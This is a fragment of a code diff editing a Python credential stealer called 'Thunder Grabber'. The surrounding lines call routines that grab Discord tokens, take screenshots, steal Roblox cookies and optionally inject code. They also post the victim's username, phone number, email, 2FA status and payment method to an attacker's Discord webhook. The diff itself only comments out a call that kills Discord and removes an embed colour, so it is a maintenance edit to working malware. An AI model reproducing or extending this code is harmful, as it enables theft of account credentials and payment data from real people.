@@ -169,7 +169,7 @@ class grabber:
         self.grabTokens()
         Thread(target=self.screenshot).start()
         self.grabRobloxCookie()
-        self.killDiscord()
+        #self.killDiscord()
         if injection == "y":
             self.injector()
         else:
@@ -470,7 +470,7 @@ class grabber:
                 hostname = socket.gethostname()
                 webhook = DiscordWebhook(url=weblink, username="Thunder", avatar_url="https://cdn.discordapp.com/attachments/961950134814535700/961950224874631228/Thighs2.jpg")
                 
-                embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉",color='4E0163')
+                embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉")
                 embed.set_author(name="⚡ Thunder Grabber ⚡", url='https://github.com/TWIST-X7')
                 embed.add_embed_field(name='🧾 Account Inforamtion ', value=f"""```
 [Username] : {user_name}\n[User ID] : {user_id}\n[Phone Number] : {phone_number}\n[Email] : {email}\n[2FA/MFA Enabled] : {mfa_enabled}\n[Nitro Status] : {has_nitro}\n[Payment Method] : {billing} ```""", inline=False)
